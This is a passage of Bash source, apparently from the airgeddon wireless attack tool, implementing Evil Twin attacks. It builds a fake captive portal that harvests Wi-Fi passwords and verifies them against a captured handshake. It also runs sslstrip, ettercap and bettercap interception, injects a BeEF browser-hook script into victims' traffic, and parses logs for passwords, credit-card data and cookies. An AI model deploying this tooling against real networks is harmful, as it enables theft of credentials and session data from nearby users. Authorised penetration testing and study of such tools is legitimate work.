	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${control_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		et_heredoc_mode=${et_mode}
	EOF

	cat >&7 <<-'EOF'
		if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
			path_to_processes="${tmpdir}${webdir}${processesfile}"
			attempts_path="${tmpdir}${webdir}${attemptsfile}"
			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			function kill_et_windows() {

				readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
				for item in "${ET_PROCESSES_TO_KILL[@]}"; do
					kill "${item}" &> /dev/null
				done
			}
	EOF

	cat >&7 <<-EOF
			function finish_evil_twin() {

				echo "" > "${et_captive_portal_logpath}"
	EOF

	cat >&7 <<-'EOF'
				date +%Y-%m-%d >>\
	EOF

	cat >&7 <<-EOF
				"${et_captive_portal_logpath}"
				{
				echo "${et_misc_texts[${language},19]}"
				echo ""
				echo "BSSID: ${bssid}"
				echo "${et_misc_texts[${language},1]}: ${channel}"
				echo "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				} >> "${et_captive_portal_logpath}"
				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
				msg_good_pass="${et_misc_texts[${language},11]}:"
				log_path="${et_captive_portal_logpath}"
				log_reminder_msg="${pink_color}${et_misc_texts[${language},24]}: [${normal_color}${et_captive_portal_logpath}${pink_color}]${normal_color}"
				done_msg="${yellow_color}${et_misc_texts[${language},25]}${normal_color}"
				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
				echo
	EOF

	cat >&7 <<-'EOF'
				echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> ${log_path}
				attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
				et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
				echo -e "\t${et_password}"
				echo
				echo -e "\t${log_reminder_msg}"
				echo
				echo -e "\t${done_msg}"
				if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
					{
					echo ""
					echo "---------------"
					echo ""
					echo "${et_misc_texts[${language},22]}:"
					echo ""
					} >> "${et_captive_portal_logpath}"
					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
					for badpass in "${BADPASSWORDS[@]}"; do
						echo "${badpass}" >>\
	EOF

	cat >&7 <<-EOF
						"${et_captive_portal_logpath}"
					done
				fi
				
				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},1]}"
				} >> "${et_captive_portal_logpath}"

				sleep 2
				killall hostapd > /dev/null 2>&1
				killall dhcpd > /dev/null 2>&1
				killall aireplay-ng > /dev/null 2>&1
				killall lighttpd > /dev/null 2>&1
				kill_et_windows
				exit 0
			}
		fi
	EOF

	cat >&7 <<-'EOF'
		date_counter=$(date +%s)
		while true; do
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[${language},4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip")
			local control_msg=${et_misc_texts[${language},5]}
		;;
		"et_sniffing_sslstrip2")
			local control_msg=${et_misc_texts[${language},27]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[${language},6]}
		;;
	esac

	cat >&7 <<-EOF
			echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
			echo -e "\t${hours}:${mins}:${secs}"
	EOF

	cat >&7 <<-EOF
			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
	EOF

	cat >&7 <<-'EOF'
			if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
				if [ -f "${tmpdir}${webdir}${successfile}" ]; then
					clear
					echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
					echo
					echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
					echo -e "\t${hours}:${mins}:${secs}"
					echo
					finish_evil_twin
				else
					attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
					last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
					tput el && echo -ne "\t${attempts_text} ${attempts_number}"
					if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
						open_parenthesis="${yellow_color}(${normal_color}"
						close_parenthesis="${yellow_color})${normal_color}"
	EOF

	cat >&7 <<-'EOF'
						echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}"
					fi
				fi
				echo
				echo
			fi
	EOF

	cat >&7 <<-EOF
			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}"
			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
			client_ips=()
	EOF

	cat >&7 <<-'EOF'
			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${et_misc_texts[${language},7]}"
			else
	EOF

	cat >&7 <<-'EOF'
				for client in "${DHCPCLIENTS[@]}"; do
					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
						client_hostname=""
						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
						if [[ -z "${client_hostname}" ]]; then
							echo -e "\t${client_ip} ${client_mac}"
						else
							echo -e "\t${client_ip} ${client_mac} ${client_hostname}"
						fi
					fi
					client_ips+=(${client_ip})
				done
			fi
			echo -ne "\033[K\033[u"
			sleep 0.3
		done
	EOF

	exec 7>&-
	sleep 1
}

#Launch dnsspoof dns black hole for captive portal Evil Twin attack
function launch_dns_blackhole() {

	debug_print

	recalculate_windows_sizes
	xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Launch control window for Evil Twin attacks
function launch_control_window() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			control_scr_window_position=${g1_topright_window}
		;;
		"et_sniffing")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_captive_portal")
			if [ ${captive_portal_mode} = "internet" ]; then
				control_scr_window_position=${g3_topright_window}
			else
				control_scr_window_position=${g4_topright_window}
			fi
		;;
		"et_sniffing_sslstrip")
			control_scr_window_position=${g4_topright_window}
		;;
		"et_sniffing_sslstrip2")
			control_scr_window_position=${g4_topright_window}
		;;
	esac
	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_file}\"" > /dev/null 2>&1 &
	et_process_control_window=$!
}

#Create configuration file for lighttpd
function set_webserver_config() {

	debug_print

	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1

	{
	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_cgi\""
	echo -e ")\n"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"${indexfile}\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "${tmpdir}${webserver_file}"

	sleep 2
}

#Create captive portal files. Cgi bash scripts, css and js file
function set_captive_portal_page() {

	debug_print

	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	{
	echo -e "body * {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
	echo -e "}\n"
	echo -e ".button {"
	echo -e "\tcolor: #ffffff;"
	echo -e "\tbackground-color: #1b5e20;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\tcursor: pointer;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\tbackground-color: #43a047;"
	echo -e "\tpadding: 20px;"
	echo -e "\tmargin: 15px auto 0;"
	echo -e "\tborder-radius: 15px;"
	echo -e "\tcolor: #ffffff;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\ttext-align: center;"
	echo -e "\tmargin-bottom: 15px;"
	echo -e "}\n"
	echo -e "#password {"
	echo -e "\twidth: 100%;"
	echo -e "\tmargin-bottom: 5px;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e "#password:hover,"
	echo -e "#password:focus {"
	echo -e "\tbox-shadow: 0 0 10px #69f0ae;"
	echo -e "}\n"
	echo -e ".bold {"
	echo -e "\tfont-weight: bold;"
	echo -e "}\n"
	echo -e "#showpass {"
	echo -e "\tvertical-align: top;"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${cssfile}"

	{
	echo -e "(function() {\n"
	echo -e "\tvar onLoad = function() {"
	echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
	echo -e "\t\tif (formElement != null) {"
	echo -e "\t\t\tvar password = document.getElementById(\"password\");"
	echo -e "\t\t\tvar showpass = function() {"
	echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
	echo -e "\t\t\tvar validatepass = function() {"
	echo -e "\t\t\t\tif (password.value.length < 8) {"
	echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t\telse {"
	echo -e "\t\t\t\t\tformElement.submit();"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
	echo -e "\t\t}"
	echo -e "\t};\n"
	echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
	echo -e "})();\n"
	echo -e "function redirect() {"
	echo -e "\tdocument.location = \"${indexfile}\";"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${jsfile}"

	{
	echo -e "#!/usr/bin/env bash"
	echo -e "echo '<!DOCTYPE html>'"
	echo -e "echo '<html>'"
	echo -e "echo -e '\t<head>'"
	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
	echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
	echo -e "echo -e '\t</head>'"
	echo -e "echo -e '\t<body>'"
	echo -e "echo -e '\t\t<div class=\"content\">'"
	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
	echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid}</span>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
	echo -e "echo -e '\t\t\t\t<label>'"
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
	echo -e "echo -e '\t\t\t\t</label>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
	echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}${indexfile}"

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/usr/bin/env bash
		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'
	EOF

	cat >&4 <<-'EOF'
		POST_DATA=$(cat /dev/stdin)
		if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
			POST_DATA=${POST_DATA#*=}
			password=${POST_DATA/+/ }
			password=${password//[*&\/?<>]}
			password=$(printf '%b' "${password//%/\\x}")
			password=${password//[*&\/?<>]}
		fi

		if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
	EOF

	cat >&4 <<-EOF
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
	EOF

	cat >&4 <<-'EOF'
			echo "${password}" >\
	EOF

	cat >&4 <<-EOF
			"${tmpdir}${webdir}${currentpassfile}"
			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
	EOF

	cat >&4 <<-'EOF'
			if [ "$?" = "0" ]; then
	EOF

	cat >&4 <<-EOF
				touch "${tmpdir}${webdir}${successfile}"
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
	EOF

	cat >&4 <<-'EOF'
				echo "${password}" >>\
	EOF

	cat >&4 <<-EOF
				"${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
	EOF

	cat >&4 <<-'EOF'
		elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
	EOF

	cat >&4 <<-EOF
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi
		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'
	EOF

	cat >&4 <<-'EOF'
		if [ ${et_successful} -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}

#Launch lighttpd webserver for captive portal Evil Twin attack
function launch_webserver() {

	debug_print

	killall lighttpd > /dev/null 2>&1
	recalculate_windows_sizes
	if [ ${captive_portal_mode} = "internet" ]; then
		lighttpd_window_position=${g3_bottomright_window}
	else
		lighttpd_window_position=${g4_bottomright_window}
	fi
	xterm -hold -bg black -fg yellow -geometry "${lighttpd_window_position}" -T "Webserver" -e "lighttpd -D -f \"${tmpdir}${webserver_file}\"" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Launch sslstrip for sslstrip sniffing Evil Twin attack
function launch_sslstrip() {

	debug_print

	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
	recalculate_windows_sizes
	xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "Sslstrip" -e "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Launch ettercap sniffer
function launch_ettercap_sniffing() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing")
			sniffing_scr_window_position=${g3_bottomright_window}
		;;
		"et_sniffing_sslstrip")
			sniffing_scr_window_position=${g4_bottomright_window}
		;;
	esac
	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
	if [ ${ettercap_log} -eq 1 ]; then
		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
	fi

	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer" -e "${ettercap_cmd}" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Create configuration file for beef
function set_beef_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1

	beef_db_path=""
	if [ -d "${beef_path}db" ]; then
		beef_db_path="db/${beef_db}"
	else
		beef_db_path="${beef_db}"
	fi

	{
	echo -e "beef:"
	echo -e "    version: 'airgeddon integrated'"
	echo -e "    debug: false"
	echo -e "    client_debug: false"
	echo -e "    crypto_default_value_length: 80"
	echo -e "    restrictions:"
	echo -e "        permitted_hooking_subnet: \"${et_ip_range}/24\""
	echo -e "        permitted_ui_subnet: \"0.0.0.0/0\""
	#TODO: This should be permitted_ui_subnet: "127.0.0.1/32" but is not possible to use it with bettercap's proxy because of a bug
	#https://github.com/evilsocket/bettercap/issues/356
	#https://github.com/beefproject/beef/issues/1337
	echo -e "    http:"
	echo -e "        debug: false"
	echo -e "        host: \"0.0.0.0\""
	echo -e "        port: \"${beef_port}\""
	echo -e "        dns_host: \"localhost\""
	echo -e "        dns_port: 53"
	echo -e "        web_ui_basepath: \"/ui\""
	echo -e "        hook_file: \"/${jshookfile}\""
	echo -e "        hook_session_name: \"BEEFHOOK\""
	echo -e "        session_cookie_name: \"BEEFSESSION\""
	echo -e "        web_server_imitation:"
	echo -e "            enable: true"
	echo -e "            type: \"apache\""
	echo -e "            hook_404: false"
	echo -e "            hook_root: false"
	echo -e "    database:"
	echo -e "        driver: \"sqlite\""
	echo -e "        db_file: \"${beef_db_path}\""
	echo -e "    credentials:"
	echo -e "        user: \"beef\""
	echo -e "        passwd: \"${beef_pass}\""
	echo -e "    autorun:"
	echo -e "        enable: true"
	echo -e "        result_poll_interval: 300"
	echo -e "        result_poll_timeout: 5000"
	echo -e "        continue_after_timeout: true"
	echo -e "    dns_hostname_lookup: false"
	echo -e "    integration:"
	echo -e "        phishing_frenzy:"
	echo -e "            enable: false"
	echo -e "    extension:"
	echo -e "        requester:"
	echo -e "            enable: true"
	echo -e "        proxy:"
	echo -e "            enable: true"
	echo -e "            key: \"beef_key.pem\""
	echo -e "            cert: \"beef_cert.pem\""
	echo -e "        metasploit:"
	echo -e "            enable: false"
	echo -e "        social_engineering:"
	echo -e "            enable: true"
	echo -e "        evasion:"
	echo -e "            enable: false"
	echo -e "        console:"
	echo -e "            shell:"
	echo -e "                enable: false"
	echo -e "        ipec:"
	echo -e "            enable: true"
	echo -e "        dns:"
	echo -e "            enable: false"
	echo -e "        dns_rebinding:"
	echo -e "            enable: false"
	} >> "${tmpdir}${beef_file}"
}

#Kill beef process
function kill_beef() {

	debug_print

	if ! killall "${optional_tools_names[19]}" > /dev/null 2>&1; then
		beef_pid=$(ps uax | pgrep -f "${optional_tools_names[19]}")
		if ! kill "${beef_pid}" &> /dev/null; then
			beef_pid=$(ps uax | pgrep -f "beef")
			kill "${beef_pid}" &> /dev/null
		fi
	fi
}

#Detects if your beef is Flexible Brainfuck interpreter instead of BeEF
function detect_fake_beef() {

	debug_print

	readarray -t BEEF_OUTPUT < <(timeout -s SIGTERM 0.5 beef -h 2> /dev/null)

	for item in "${BEEF_OUTPUT[@]}"; do
		if [[ ${item} =~ Brainfuck ]]; then
			fake_beef_found=1
			break
		fi
	done
}

#Search for beef path
function search_for_beef() {

	debug_print

	if [ "${beef_found}" -eq 0 ]; then
		for item in "${possible_beef_known_locations[@]}"; do
			if [ -f "${item}beef" ]; then
				beef_path="${item}"
				beef_found=1
				break
			fi
		done
	fi
}

#Prepare system to work with beef
function prepare_beef_start() {

	debug_print

	valid_possible_beef_path=0
	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 0 ]]; then
		language_strings "${language}" 405 "blue"
		ask_yesno 191 "yes"
		if [ "${yesno}" = "y" ]; then
			manual_beef_set
			search_for_beef
		fi

		if [[ ${beef_found} -eq 1 ]] && [[ ${valid_possible_beef_path} -eq 1 ]]; then
			fix_beef_executable "${manually_entered_beef_path}"
		fi

		if [ ${beef_found} -eq 1 ]; then
			echo
			language_strings "${language}" 413 "yellow"
			language_strings "${language}" 115 "read"
		fi
	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 0 ]]; then
		fix_beef_executable "${beef_path}"
		echo
		language_strings "${language}" 413 "yellow"
		language_strings "${language}" 115 "read"
	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
		language_strings "${language}" 405 "blue"
		ask_yesno 415 "yes"
		if [ "${yesno}" = "y" ]; then
			manual_beef_set
			search_for_beef
			if [[ ${beef_found} -eq 1 ]] && [[ ${valid_possible_beef_path} -eq 1 ]]; then
				rewrite_script_with_custom_beef "set" "${manually_entered_beef_path}"
				echo
				language_strings "${language}" 413 "yellow"
				language_strings "${language}" 115 "read"
			fi
		fi
	fi
}

#Set beef path manually
function manual_beef_set() {

	debug_print

	while [[ "${valid_possible_beef_path}" != "1" ]]; do
		echo
		language_strings "${language}" 402 "green"
		read -r manually_entered_beef_path
		if [ -n "${manually_entered_beef_path}" ]; then
			lastcharmanually_entered_beef_path=${manually_entered_beef_path: -1}
			if [ "${lastcharmanually_entered_beef_path}" != "/" ]; then
				manually_entered_beef_path="${manually_entered_beef_path}/"
			fi

			firstcharmanually_entered_beef_path=${manually_entered_beef_path:0:1}
			if [ "${firstcharmanually_entered_beef_path}" != "/" ]; then
				language_strings "${language}" 404 "red"
			else
				if [ -d "${manually_entered_beef_path}" ]; then
					if [ -f "${manually_entered_beef_path}beef" ]; then
						if head "${manually_entered_beef_path}beef" -n 1 2> /dev/null | grep ruby > /dev/null; then
							possible_beef_known_locations+=(${manually_entered_beef_path})
							valid_possible_beef_path=1
						else
							language_strings "${language}" 406 "red"
						fi
					else
						language_strings "${language}" 406 "red"
					fi
				else
					language_strings "${language}" 403 "red"
				fi
			fi
		fi
	done
}

#Fix for not found beef executable
function fix_beef_executable() {

	debug_print

	rm -rf "/usr/bin/beef" > /dev/null 2>&1
	{
	echo -e "#!/usr/bin/env bash\n"
	echo -e "cd ${1}"
	echo -e "./beef"
	} >> "/usr/bin/beef"
	chmod +x "/usr/bin/beef" > /dev/null 2>&1
	optional_tools[${optional_tools_names[19]}]=1

	rewrite_script_with_custom_beef "set" "${1}"
}

#Rewrite airgeddon script in a polymorphic way adding custom beef location to array to get persistence
function rewrite_script_with_custom_beef() {

	debug_print

	case ${1} in
		"set")
			sed -ri "s:(\s+|\t+)([\"0-9a-zA-Z/\-_ ]+)?\s?(#Custom BeEF location \(set=)([01])(\)):\1\"${2}\" \31\5:" "${scriptfolder}${scriptname}" 2> /dev/null
		;;
		"search")
			beef_custom_path_line=$(grep "#[C]ustom BeEF location (set=1)" < "${scriptfolder}${scriptname}" 2> /dev/null)
			if [ -n "${beef_custom_path_line}" ]; then
				[[ ${beef_custom_path_line} =~ \"(.*)\" ]] && beef_custom_path="${BASH_REMATCH[1]}"
			fi
		;;
	esac
}

#Start beef process as a service
function start_beef_service() {

	debug_print

	if ! service "${optional_tools_names[19]}" restart > /dev/null 2>&1; then
		systemctl restart "${optional_tools_names[19]}.service" > /dev/null 2>&1
	fi
}

#Launch beef browser exploitation framework
function launch_beef() {

	debug_print

	kill_beef

	if [ "${beef_found}" -eq 0 ]; then
		start_beef_service
	fi

	recalculate_windows_sizes
	if [ "${beef_found}" -eq 1 ]; then
		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "cd ${beef_path} && ./beef -c \"${beef_file}\"" > /dev/null 2>&1 &
	else
		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "${optional_tools_names[19]}" > /dev/null 2>&1 &
	fi
	et_processes+=($!)
	sleep 2
}

#Launch bettercap sniffer
function launch_bettercap_sniffing() {

	debug_print

	recalculate_windows_sizes
	sniffing_scr_window_position=${g4_bottomright_window}

	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
		bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
	fi

	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"

	if [ ${bettercap_log} -eq 1 ]; then
		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
	fi

	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer+Bettercap-Sslstrip2/BeEF" -e "${bettercap_cmd}" > /dev/null 2>&1 &
	et_processes+=($!)
}

#Parse ettercap log searching for captured passwords
function parse_ettercap_log() {

	debug_print

	echo
	language_strings "${language}" 304 "blue"

	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | grep -E -i "USER:|PASS:")

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	for cpass in "${CAPTUREDPASS[@]}"; do
		echo "${cpass}" >> "${tmpdir}parsed_file"
		pass_counter=$((pass_counter + 1))
	done

	add_contributing_footer_to_file "${tmpdir}parsed_file"

	if [ ${pass_counter} -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 306 "blue"
		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Parse bettercap log searching for captured passwords
function parse_bettercap_log() {

	debug_print

	echo
	language_strings "${language}" 304 "blue"

	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE'
	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i ${regexp} | grep -E -vi ${regexp2})

	{
	echo ""
	date +%Y-%m-%d
	echo "${et_misc_texts[${language},8]}"
	echo ""
	echo "BSSID: ${bssid}"
	echo "${et_misc_texts[${language},1]}: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"

	pass_counter=0
	captured_cookies=()
	for cpass in "${BETTERCAPLOG[@]}"; do
		if [[ ${cpass} =~ COOKIE ]]; then
			repeated_cookie=0
			for item in "${captured_cookies[@]}"; do
				if [ "${item}" = "${cpass}" ]; then
					repeated_cookie=1
					break
				fi
			done
			if [ ${repeated_cookie} -eq 0 ]; then
				captured_cookies+=("${cpass}")
				echo "${cpass}" >> "${tmpdir}parsed_file"
				pass_counter=$((pass_counter + 1))
			fi
		else
			echo "${cpass}" >> "${tmpdir}parsed_file"
			pass_counter=$((pass_counter + 1))
		fi
	done

	add_contributing_footer_to_file "${tmpdir}parsed_file"

	if [ ${pass_counter} -eq 0 ]; then
		language_strings "${language}" 305 "yellow"
	else
		language_strings "${language}" 399 "blue"
		cp "${tmpdir}parsed_file" "${bettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings "${language}" 115 "read"
}

#Write on a file the id of the captive portal Evil Twin attack processes
function write_et_processes() {

	debug_print

	for item in "${et_processes[@]}"; do
		echo "${item}" >> "${tmpdir}${webdir}${processesfile}"
	done
}

#Kill the Evil Twin processes
function kill_et_windows() {

	debug_print

	for item in "${et_processes[@]}"; do
		kill "${item}" &> /dev/null
	done
	kill ${et_process_control_window} &> /dev/null
}

#Convert capture file to hashcat format
